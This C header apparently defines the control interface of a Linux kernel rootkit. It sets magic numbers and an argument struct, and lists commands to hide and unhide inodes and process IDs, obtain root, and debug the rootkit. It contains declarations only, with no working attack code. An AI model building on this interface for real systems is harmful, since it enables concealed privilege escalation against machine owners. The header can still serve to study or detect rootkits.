#ifndef __YSLM_CTL_H
#define __YSLM_CTL_H

#define MAGIC_NUMBER_1 0x42424242 /* TODO: should be randomized */
#define MAGIC_NUMBER_2 0x43434343

struct rk_args {
	unsigned int magic_number_1, magic_number_2;
	long mode;
	long param1, param2, param3, param4, param5, param6;
	char pad[512];
};

enum {
	HIDE_INODE = 0,
	UNHIDE_INODE,
	GET_ROOT,
	HIDE_PID,
	UNHIDE_PID,
	DEBUG_RK,
	DEBUG_STATS,
};

#endif
